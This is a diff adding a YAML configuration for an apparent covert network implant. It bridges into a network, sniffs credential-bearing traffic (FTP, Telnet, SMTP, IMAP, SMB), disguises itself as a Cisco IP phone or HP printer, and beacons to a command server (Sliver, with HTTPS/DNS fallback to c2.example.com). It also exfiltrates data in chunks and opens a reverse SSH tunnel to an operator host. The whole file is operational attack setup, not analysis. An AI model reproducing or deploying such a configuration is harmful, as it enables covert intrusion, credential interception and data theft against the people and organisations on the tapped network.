@@ -1,0 +1,133 @@
+device:
+  hostname: "SEP001BD5A1B2C3"
+  model: "Cisco IP Phone 7960"
+  firmware: "P0S3-08-12-00"
+
+network:
+  upstream_iface: "eth0"
+  downstream_iface: "eth1"
+  bridge_name: "br0"
+  bridge_mac: "auto"
+  # Static IP for management (on br0). Set to "dhcp" for auto.
+  management_ip: "dhcp"
+
+nac_bypass:
+  enabled: false
+  # Timeout for passive host discovery (seconds)
+  discovery_timeout: 120
+
+sniffer:
+  enabled: true
+  capture_dir: "/opt/raccoon/captures"
+  max_pcap_size_mb: 50
+  max_total_size_mb: 500
+  rotate_count: 10
+  bpf_filter: ""
+  # Interesting traffic filters (applied in addition to bpf_filter)
+  capture_profiles:
+    - name: "credentials"
+      filter: "tcp port 21 or tcp port 23 or tcp port 25 or tcp port 110 or tcp port 143 or tcp port 445"
+      enabled: true
+    - name: "http"
+      filter: "tcp port 80 or tcp port 8080 or tcp port 8443"
+      enabled: true
+    - name: "dns"
+      filter: "udp port 53"
+      enabled: false
+    - name: "all"
+      filter: ""
+      enabled: false
+
+cover:
+  enabled: true
+  # Cover identity: "cisco_phone" or "hp_printer"
+  mode: "cisco_phone"
+
+  # Cisco IP Phone 7960 settings (mode: cisco_phone)
+  cisco_phone:
+    http_port: 80
+    sip_port: 5060
+    rtp_port: 10000
+
+  # HP Color LaserJet Pro MFP M478 settings (mode: hp_printer)
+  hp_printer:
+    http_port: 80
+    pjl_port: 9100
+    lpd_port: 515
+    ipp_port: 631
+    snmp_port: 161
+    telnet_port: 23
+
+c2:
+  enabled: true
+
+  # ── Primary: Sliver Beacon (Go binary, compiled for linux/arm64) ──
+  sliver:
+    enabled: true
+    implant_path: "/opt/raccoon/bin/implant"
+    # Optional: staging URL to download implant on first boot
+    staging_url: ""
+    staging_key: ""
+    # SHA256 of the expected binary (integrity check, leave empty to skip)
+    sha256: ""
+    restart_delay_seconds: 30
+    # 0 = unlimited restarts
+    max_restarts: 0
+
+  # ── Fallback: Custom Python beacon (if Sliver binary unavailable) ──
+  fallback:
+    enabled: true
+    https:
+      enabled: true
+      callback_url: "https://c2.example.com/api/v1/beacon"
+      verify_ssl: false
+    dns:
+      enabled: true
+      domain: "c2.example.com"
+      resolver: "8.8.8.8"
+
+  beacon_interval_seconds: 300
+  jitter_percent: 20
+  # Exfiltration method: "dns" or "https"
+  exfil_method: "https"
+  exfil_chunk_size_bytes: 512
+
+remote_access:
+  ssh:
+    ssh_enabled: true
+    # Operator-controlled SSH server the implant connects back to
+    ssh_remote_host: ""
+    ssh_remote_port: 22
+    ssh_remote_user: "raccoon"
+    # Port opened on the operator server that tunnels back to the implant
+    ssh_tunnel_port: 2222
+    # Local sshd port on the implant (127.0.0.1 only)
+    ssh_local_port: 22
+    # Key type: ed25519 (recommended), rsa, ecdsa
+    ssh_key_type: "ed25519"
+
+  vnc:
+    vnc_enabled: false
+    # VNC binds to 127.0.0.1 only — access via SSH tunnel
+    vnc_port: 5900
+    vnc_password: "raccoon"
+    vnc_resolution: "1024x768"
+
+notifications:
+  enabled: false
+  slack:
+    enabled: false
+    webhook_url: ""
+  discord:
+    enabled: false
+    webhook_url: ""
+  teams:
+    enabled: false
+    webhook_url: ""
+
+logging:
+  log_dir: "/opt/raccoon/logs"
+  max_size_mb: 5
+  backup_count: 3
+  console_level: "INFO"
+  file_level: "DEBUG"
